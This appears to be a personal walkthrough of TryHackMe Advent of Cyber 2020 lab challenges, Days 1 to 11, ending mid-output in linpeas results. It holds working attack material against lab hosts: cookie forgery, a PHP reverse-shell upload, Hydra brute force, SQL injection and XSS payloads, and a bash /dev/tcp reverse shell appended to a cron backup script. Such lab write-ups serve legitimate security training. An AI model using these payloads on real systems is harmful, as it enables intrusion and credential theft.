# Day 1
* We can go onto the website and regsiter/login.
* Once we do that, viewing the cookies shows us a hexidecimal value named "auth"
* We can decode that with `echo <hex_string> | xxd -r -p`
* We want to log in to "santa", so let's switch our user for that with the following command:
* `echo <hex_string> | xxd -r -p | sed s/<your_username>/santa/g | xxd -p | tr -d '\n'`
* Once we replace the value of the previous cookie with the new one in the "Applications->Cookies" section on chrome developer tools, we get authenticated as santa and can turn on all the controls
* The flag is `THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}` 


# Day 2
* My ID number was `ODIzODI5MTNiYmYw`
	* We can then go to the website and enter that in as a GET parameter:
	* `http://10.10.71.84/?id=ODIzODI5MTNiYmYw`
* There's a place images, so let's try to upload a malicious script - a reverse shell
* I got a php reverse shell [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
        * Make sure you edit your ip to be the one on tun0 and change the port to what you want
```
$ip = '10.6.36.105';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
```
* Uploading the php file doesn't work because the system doesn't allow php extensions
* Looking at the source code shows that the website allows uploads of `.jpeg, .jpg, .png`. Let's try to disguise our script as one of those
	* We can rename the file to `php-reverse-shell.jpg.php`
	* This works because this particular website checks file extensions by splitting on a period and checking the second index
* Now we need to find where the images are stored
	* We can do that with gobuster:
* `gobuster dir -u "http://10.10.71.84/" -w /usr/share/wordlists/dirb/common.txt" -b "200"
	* We include a blacklist for status codes of 200 because the website will return a 200 for any directory you put in
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:                     http://10.10.71.84/
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   200
[+] User Agent:              gobuster/3.0.1
[+] Timeout:                 10s
===============================================================
2020/12/02 19:04:07 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/cgi-bin/ (Status: 403)
/noindex (Status: 301)
/uploads (Status: 301)
===============================================================
2020/12/02 19:04:58 Finished
===============================================================
```
* We can see that `/uploads` is a valid directory. Going there on `http://10.10.71.84/uploads/` shows our uploaded shell

* Now we can set up a reverse listener on our machine with `nc -lvnp 1337`
	* Remember to use the same port as the one on the reverse shell script
* To run the script on their server, we can simply click on it
	* We get a shell!
* Now we can `cat /var/www/flag.txt` to get the flag: `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}`

# Day 3
* If we go to the IP, we can see a login page

## 1.Directory discovery
* This likely wasn't the intention of the person who made the problem, but we can get the flag with a bit of directory discovery
* `gobuster dir -u http://10.10.181.149/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50`
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.181.49/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/03 19:55:47 Starting gobuster
===============================================================
/tracker (Status: 200)
/Tracker (Status: 200)
===============================================================
2020/12/03 20:04:10 Finished
===============================================================
```
* We can see an open directory called `/tracker`
	* Going there gets us to the site without logging in
* The flag is `THM{885ffab980e049847516f9d8fe99ad1a}`  

## 2.Dictionary Credential Attack
* First, we can turn on burpsuite and our proxy and go to the link
* When we enter a test username and password, we get the following request:
```
POST /login HTTP/1.1
Host: 10.10.181.49
Content-Length: 28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.181.49
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.181.49/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ca;q=0.8
Connection: close

username=test&password=test1
```

* From here, we can do a dictionary attack in one of two ways:
### a) Burpsuite
* Hitting `CTRL + I` will send the request to the intruder tab of burpsuite
* Here, we can replace the usename and password variables with something else
	* You can see that burp put characters around your test username and password to indicate that they are variables:
		* `username=§test§&password=§test1§`
* Going to the Payloads subtab, we can load usernames in set 1 and passwords in set 2
	* You can either manually input common or discovered credentials, or you can use a wordlist
	* I'll be using the `cirt-default` wordlists in `usr/share/wordlists/seclists/`
* Now go back to the Positions subtab and select `Cluster bomb` as the attack type
* Hitting `Start Attack` will start trying passwords.
* We get a series of response codes and lengths
	* The one that is different from the others will be the one that likely got us a login
	* Only one request had a length of 255, and that used the username `admin` and the password `12345`
		* Trying that logs us in!
* The flag is `THM{885ffab980e049847516f9d8fe99ad1a}`

### b) Hydra
* We can use hydra to quickly do a dictionary attack
* There are a couple things we need to take note of first:
	* We are making a post request based on what we got from burp
	* We are making a post request to /login
	* When we get a username or password wrong, the website gives us the message `Your password is incorrect..`
* We can run the command `hydra -L /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/seclists/Passwords/cirt-default-passwords.txt 10.10.181.49 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -f`
	* `-L` sets the username list
	* `-P` sets the password list
	* `10.10.181.49` is the website
	* `http-post-form` is the request type that burp gave us
	* `/login` is where burp indicated the post request was being sent
	* `username=^USER^&password=^PASS^` is the request that burp indcated was being sent (with variables being set with `^USER^` and `^PASS^`)
	* `incorrect` is a word that shows up on the website when our login doesn't work
	* `-f` ends the attack once one of our credentials works

* We get the following response: `[80][http-post-form] host: 10.10.181.49   login: admin   password: 12345`
* Logging in gets us the flag: `THM{885ffab980e049847516f9d8fe99ad1a}`

# Day 4

## Gobuster
* `gobuster dir -u http://10.10.143.161 -w /usr/share/wordlists/dirb/common.txt -x php -t 20`

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.143.161
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/12/05 02:53:24 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.hta (Status: 403)
/.hta.php (Status: 403)
/api (Status: 301)
/index.html (Status: 200)
/LICENSE (Status: 200)
/server-status (Status: 403)
===============================================================
2020/12/05 02:54:50 Finished
===============================================================
```
* The `/api` folder stands out
	* There's a file in the directory called `site-log.php`

## Fuzzing
* We know from the challenge there's an a api that `creates logs using dates with a format of YYYYMMDD`
* Let's generate a wordlist with some potential dates:
```python
start_year = 2019
end_year = 2020


with open("dates.txt", "w") as fout:
	for year in range(start_year, end_year+1):
		for month in range(1,13):
			for day in range(1,32): # We don't have to worry about some minor inefficiencies in dates
				fout.write(f'{year}{month:02}{day:02}\n')
```
* Now that we have a set of potential dates in the file `dates.txt`, we can run the following command:
* `wfuzz -z file,dates.txt --hw 0 10.10.143.161/api/site-log.php?date=FUZZ`
	* `-z file,dates.txt` indicates that we're looking for files by replacing "FUZZ" witht the words in `dates.txt`
	* `--hw 0` indicates that we don't want any responses with 0 words
	* `10.10.143.161/api/site-log.php?date=FUZZ` indicates the file we are requesting with "FUZZ" replacing what should be the date
```
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.143.161/api/site-log.php?date=FUZZ
Total requests: 744

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                     
===================================================================

000000707:   200        0 L      1 W      13 Ch       "20201125"                                                                                                  

Total time: 13.23737
Processed Requests: 744
Filtered Requests: 743
Requests/sec.: 56.20448
```	
* We see that the date `20201125` worked
* Going to `http://10.10.143.161/api/site-log.php?date=20201125` gives us the flag: `THM{D4t3_AP1}`


# Day 5
* When we go to `http://10.10.0.174:8000/`, we can see the website homepage
* The challenge tells us not to bruteforce the login page, but let's do it anyway
* I tried gobuster with the stock wordlist and it didnt' work, so let's make a custom wordlist
* First, we can get some words with `cewl http://10.10.0.174:8000/ > websiteWords.txt`
* Now, to generate the wordlist with that, we can use [mentalist](https://github.com/sc0tfree/mentalist)
	* We can input in our baselist as `/usr/share/wordlists/dirb/common.txt` and set our append or prepend to `websiteWords.txt`. The case can also be chosen
	* I saved this in `finalWordlist.txt`
* Then, running `gobuster dir -u http://10.10.0.174:8000/ -w finalWordlist.txt -t 20`, we get the following: 
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.0.174:8000/
[+] Threads:        20
[+] Wordlist:       finalWordlist.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/06 05:10:18 Starting gobuster
===============================================================
/santapanel (Status: 200)
===============================================================
2020/12/06 05:50:54 Finished
===============================================================
```

* `/santapanel` works. When we go there, we get a login page
* Let's try to get past it with a bit of SQLi
* Inputting `' OR 1=1 ; --` logs us in
	* `'` ends the string
	* `OR 1=1` returns true, which allows the query to select everything
	* `; -- ` ends the query and ignores everything afterward
* Now we can input the same stuff, and that gets us all of the gifts and children (22 of them), but we can't see the rest of the database
	* Another way to ouput the full two columns that might seem more intuitive is `' ; --`
* We can assume that there's also a username and password column, so let's type in `' UNION SELECT username, password FROM users --`
	* This shows use the username `admin` and the password `EhCNSWzzFP6sc7gB`, but we still can't see the flag
* We don't know the names of the tables, so let's get that by appending the tablenames with `' UNION SELECT name, sql FROM sqlite_master WHERE type='table' ; --`
* Now we can see that there are tables called `hidden_table`, `sequels`, and `users`
* The `hidden_table` table has the column `flag` of type `text`
	* Let's get those with `' UNION SELECT flag,NULL FROM hidden_table ; --`
	* Now we can see the flag `thmfox{All_I_Want_for_Christmas_Is_You}`

* Of course, all of this could also be automated with sqlmap
* Using burpsuite, we could turn on our proxy and intercept a request on the search page
	* I saved this as `burpFile.txt` by right-clicking on the request in burp and selecting `Save Item`
* Now, we can run `sqlmap -r burpFile.txt --dbms=sqlite -a` and press enter a few times to chose default settings, which will dump the whole database

# Day 6
* Going to `http://10.10.249.208:5000/`, there a are a couple inputs
	* We can input an example wish
	* Now, going to the source code of the website, we can see that it was modified
		* This tells us that the site likely isn't pulling from some kind of database.
* We can test for cross-site scripting by typing in `<script>alert(1)</script>`
	* This doesn't work and looks like it breaks the page instead.
* Maybe they're sanitizing the input?
	* One way that inputs are sanitized is by checking tags on the outside of the input
	* We can try `</script><script>alert(1)</script><script>`	
		* Because `</thing><thing>` isn't valid html, that can get past the site
	

* Another way that we see a possible exploit is through the get requests made in the url `http://10.10.249.208:5000/?q=<INPUT>`
	* We can see that there's a parameter `q` that we can set equal to our query
	* Let's try `http://10.10.249.208:5000/?q=<script>alert(2)</script>`
		* That works


* Of course, the testing here can be done automatically by running an automatic scan with ZAP and looking at the alerts
	* When running this, it gives options for persistent and reflected xss

# Day 7
* Opening `pcap1.pcap` in wireshark, looking at the `Info` column, we can look for `ICMP`
	* Once we find that, we can look at the `Source` column to get the IP: `10.11.3.2`

* We can filter for GET requests with `http.request.method == GET`

* We can look at GET requests made with a specific ip with `http.request.method == GET && ip.src == 10.10.67.199`
	* It looks like this machine visited `/posts/reindeer-of-the-week/`
		* The article name is `reindeer-of-the-week`


* Typing `ftp` as a filter shows us all the ftp traffic
	* There's a request that shows us the info `Request: USER elfmcskidy`
		* We can right-click on this and select `follow` -> `TCP Stream` to see all te requests made in this stream
		* We get the following output in ASCII mode:
```
220 Welcome to the TBFC FTP Server!.
USER elfmcskidy
331 Please specify the password.
PASS plaintext_password_fiasco
530 Login incorrect.
SYST
530 Please login with USER and PASS.
QUIT
221 Goodbye.
```
* Username: `elfmcskidy`
* Password: `plaintext_password_fiasco`

* There's also a request for `USER anonymous`, but we don't care too much about that since we're looking for credentials

* Scrolling through the pcaps, we can look at the `Protocol` column and we see a lot of `SSH` packets

* Looking through the packets a bit more, we can see that `HTTP` made a `GET` request for `/christmas.zip`
* An easy way to extract files out of wireshark packet captures is by going to `File` -> `Export Objects` -> `HTTP` (because we saw that was how the file was downloaded) -> select `christmas.zip`
	* Once you save the file, you can extract it and `cat elf_mcskidy_wishlist.txt`, which gets the following output:
```
Wish list for Elf McSkidy
-------------------------
Budget: £100

x3 Hak 5 Pineapples
x1 Rubber ducky (to replace Elf McEager)
```
* The replacement for Elf McEager is `Rubber ducky`

# Day 8
### IP
`10.10.4.45`

| [Snort](https://www.cyber.gov.au/acsc/view-all-content/glossary/snort) is a free open source network intrusion detection system and intrusion prevention system created in 1998 by Martin Roesch, founder and former CTO of Sourcefire. Snort is now developed by Cisco, which purchased Sourcefire in 2013.



### Nmap Scan
`nmap -sV -sC 10.10.4.45 -oN initial.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-10 02:05 EST
Nmap scan report for 10.10.4.45
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Hugo 0.78.2
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: TBFC&#39;s Internal Blog
2222/tcp open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cf:c9:99:d0:5c:09:27:cd:a1:a8:1b:c2:b1:d5:ef:a6 (RSA)
|   256 4c:d4:f9:20:6b:ce:fc:62:99:54:7d:c2:b4:b2:f2:b2 (ECDSA)
|_  256 d0:e6:72:18:b5:20:89:75:d5:69:74:ac:cc:b8:3b:9b (ED25519)
3389/tcp open  ms-wbt-server xrdp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.05 seconds

```
* Ports `80,2222,3389` are open
* The server is likely running on `ubuntu`
* The site is hosting "TBFC's Internal `Blog`, which can be seen in the HTTP-TITLE

`nmap -Pn 10.10.4.45 -oN ignoreICMP.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-10 02:09 EST
Nmap scan report for 10.10.4.45
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 8.95 seconds
```

`nmap -A -T4 -Pn 10.10.4.45 -oN`
* `A typical Nmap scan is shown in Example 1. The only Nmap arguments used in this example are -A, to enable OS and version detection, script scanning, and traceroute`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-10 02:12 EST
Nmap scan report for 10.10.4.45
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Hugo 0.78.2
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: TBFC&#39;s Internal Blog
2222/tcp open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cf:c9:99:d0:5c:09:27:cd:a1:a8:1b:c2:b1:d5:ef:a6 (RSA)
|   256 4c:d4:f9:20:6b:ce:fc:62:99:54:7d:c2:b4:b2:f2:b2 (ECDSA)
|_  256 d0:e6:72:18:b5:20:89:75:d5:69:74:ac:cc:b8:3b:9b (ED25519)
3389/tcp open  ms-wbt-server xrdp
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/10%OT=80%CT=1%CU=39585%PV=Y%DS=4%DC=T%G=Y%TM=5FD1CB
OS:05%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M509ST11NW6%O2=M509ST11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M509ST
OS:11NW6%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M509NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 2382/tcp)
HOP RTT       ADDRESS
1   40.33 ms  10.6.0.1
2   ... 3
4   113.65 ms 10.10.4.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.07 seconds
```


# Day 9
### IP
`10.10.241.67`


### nmap
`nmap -sC -sV 10.10.241.67 -oN initial.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-10 02:26 EST
Nmap scan report for 10.10.241.67
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Nov 16 15:04 backups
| drwxr-xr-x    2 0        0            4096 Nov 16 15:05 elf_workshops
| drwxr-xr-x    2 0        0            4096 Nov 16 15:04 human_resources
|_drwxrwxrwx    2 65534    65534        4096 Nov 16 19:35 public [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.36.105
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:ce:52:11:22:9e:b1:c0:ae:45:2a:f9:2f:70:eb:cb (RSA)
|   256 4b:77:b2:d4:76:53:8c:ec:cb:be:3a:69:51:ff:3c:8f (ECDSA)
|_  256 53:3f:2f:ca:c2:d6:ce:ec:99:30:f7:1f:ce:a5:d7:f5 (ED25519)
Service Info: Host: Welcome; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.91 seconds
```
* nmap tells us that ftp is open with anonymous login
* It also says we can upload scripts

### FTP login
`ftp 10.10.241.67`
* We can log in with `ftp 10.10.241.67` and with the username `anonymous`
* Now, typing `dir` shows us that we have access to all the directories listed, but only `public` actually has anything
* Go to the directory with `cd public` and download the files with `get backup.sh` and `get shoppinglist.txt`
* exit by typing `quit`
* `cat shoppinglist.txt` on our own machine shows us that santa wanted `The Polar Express Movie`

### Reverse Shell
* When we look at `backup.sh`, we cn see that the script automatically runs periodically to backup
* Luckily, we are allowed to modify files on the ftp server, which means we can add in a script to get us a reverse shell
* We can edit the script to include `/bin/bash -i >& /dev/tcp/10.6.36.105/1337 0>&1` at the end (ensuring you pick your ip on tun0)
	* Set up a listener locally with `nc -lvnp 1337`
* Now, we can upload the file by loggin in again, running `delete backup.sh` and replacing it with our copy by typing `put backup.sh`
* Waiting for a couple minutes gets us a reverse shell!

* Now we can `cat /root/root/txt` to get the flag: `THM{even_you_can_be_santa}`

# Day 10
IP: `10.10.51.9`
### nmap
`nmap -sC -sV 10.10.51.9 -oN initial.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 11:09 EST
Nmap scan report for 10.10.51.9
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fa:70:d4:c2:86:0e:e3:fb:9f:0a:36:7a:11:36:a5:dc (RSA)
|   256 4b:12:67:10:b4:a5:21:0d:30:ad:ef:15:ae:c4:04:97 (ECDSA)
|_  256 e4:ea:83:e9:cf:fe:9f:e9:fa:a2:8e:2f:b7:fc:b4:c0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: TBFC-SMB-01)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: TBFC-SMB-01)
Service Info: Host: TBFC-SMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: TBFC-SMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: tbfc-smb
|   NetBIOS computer name: TBFC-SMB\x00
|   Domain name: \x00
|   FQDN: tbfc-smb
|_  System time: 2020-12-20T16:10:17+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-20T16:10:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.73 seconds

```
* We have smb running. Let's use enum4linux and smbmap:

### enum4linux
`enum4linux -U 10.10.51.9`
```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Dec 20 11:07:35 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.51.9
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 10.10.51.9    |
 ================================================== 
[+] Got domain/workgroup name: TBFC-SMB-01

 =================================== 
|    Session Check on 10.10.51.9    |
 =================================== 
[+] Server 10.10.51.9 allows sessions using username '', password ''

 ========================================= 
|    Getting domain SID for 10.10.51.9    |
 ========================================= 
Domain Name: TBFC-SMB-01
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =========================== 
|    Users on 10.10.51.9    |
 =========================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy	Name: 	Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager	Name: elfmceager	Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson	Name: 	Desc: 

user:[elfmcskidy] rid:[0x3e8]
user:[elfmceager] rid:[0x3ea]
user:[elfmcelferson] rid:[0x3e9]
enum4linux complete on Sun Dec 20 11:07:44 2020

```
* We see users `elfmcskidy`, `elfmceager`, and `elfmcelferson`
### smbmap
`smbmap -H 10.10.51.9`
```
[+] Guest session   	IP: 10.10.51.9:445	Name: 10.10.51.9                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	tbfc-hr                                           	NO ACCESS	tbfc-hr
	tbfc-it                                           	NO ACCESS	tbfc-it
	tbfc-santa                                        	READ, WRITE	tbfc-santa
	IPC$                                              	NO ACCESS	IPC Service (tbfc-smb server (Samba, Ubuntu))

```
* There are 4 shares running
* We can access the `tbfc-santa` share
	* Let's do that with `smbclient //10.10.51.9/tbfc-santa` and by pressing enter without a password
* `dir` shows us that theres a directory and a file
	* We can download the file with `get note_from_mcskidy.txt`
	* There's an empty directory called `jingle-tunes`
	* Unfortunately, it doesn't look like there's anything interesting here
# Day 11
* SSH into the box with `ssh cmnatic@10.10.138.250` and the password `aoc2020`
* It looks like the box isn't connected to the internet, which means we need another way to upload enumeration scripts (I'll be using linpeas)

* Set up a simple file server with `python -m SimpleHTTPServer 80` in the same directory as the file
	* My ip is `10.6.36.105`, so we can use `wget "http://10.6.36.105/linpeas.sh"` on the box to download the file

* Change file permissions with `chmod +x linpeas.sh` and run with `./linpeas.sh`
* There's a ton of output, but the key at the top indicates we should be looking for stuff highlighted in red
	* Here's some of that output:

```
[+] Searching Keyring files
Keyring folder: /usr/share/keyrings
/usr/share/keyrings:

...

[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping6
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/10444/bin/ping6
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/10444/bin/ping
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/7270/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/7270/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/usr/bin/chsh
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/7270/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/10444/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/10444/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/10444/usr/bin/chsh
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/10444/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/7270/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/bin/su
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/10444/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/10444/bin/su
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root   root             27K May 15  2019 /snap/core/7270/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             40K May 15  2019 /snap/core/7270/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root   root            1.1M Jun  6  2019 /bin/bash
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            134K Jun 10  2019 /snap/core/7270/usr/bin/sudo  --->  /sudo$
-rwsr-sr-x 1 root   root            101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
